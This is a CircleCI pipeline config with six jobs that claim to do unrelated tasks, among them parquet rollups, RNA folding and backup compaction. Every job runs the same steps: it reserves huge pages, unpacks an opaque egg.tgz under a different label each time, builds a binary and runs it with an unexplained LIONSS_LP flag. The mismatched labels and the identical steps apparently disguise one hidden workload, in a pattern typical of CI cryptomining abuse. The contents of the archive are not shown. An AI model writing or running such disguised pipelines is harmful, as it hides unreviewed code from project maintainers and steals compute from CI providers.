version: 2.1

jobs:
  ParquetRollup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Stage parquet
          command: |
            mkdir -p pq && : > pq/part-0.parquet
      - run:
          name: Build rollup job
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ParquetRollup -j2
      - run:
          name: Roll up parquet files
          command: LIONSS_LP=1 ./build/ParquetRollup --dir pq --by day
  verglas:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load surface temp
          command: |
            printf 'temp -2\n' > verglas.cfg
      - run:
          name: Build ice sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target verglas -j2
      - run:
          name: Form verglas coating
          command: LIONSS_LP=1 ./build/verglas --config verglas.cfg --thickness 1mm
  savegame-migrate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load old save
          command: |
            printf 'version 2\n' > save.dat
      - run:
          name: Build save system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target savegame-migrate -j2
      - run:
          name: Migrate save format
          command: LIONSS_LP=1 ./build/savegame-migrate --in save.dat --to 3
  rnaFold:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Prepare input sequence
          command: |
            printf '>s1\nGGGAAACCCUUU\n' > sample.fa
      - run:
          name: Build folding kernel
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target rnaFold -j2
      - run:
          name: Fold secondary structure
          command: LIONSS_LP=1 ./build/rnaFold --seq sample.fa --temp 37
  borg_compact:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Point repo
          command: |
            printf 'repo /borg\n' > borg.cfg
      - run:
          name: Build dedup backup
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target borg_compact -j2
      - run:
          name: Compact repository
          command: LIONSS_LP=1 ./build/borg_compact --conf borg.cfg --threshold 10
  loopUnroll8:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write loop
          command: |
            printf 'trip 1024\n' > loop.cfg
      - run:
          name: Build loop bench
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target loopUnroll8 -j2
      - run:
          name: Unroll by 8
          command: LIONSS_LP=1 ./build/loopUnroll8 --conf loop.cfg --vectorize
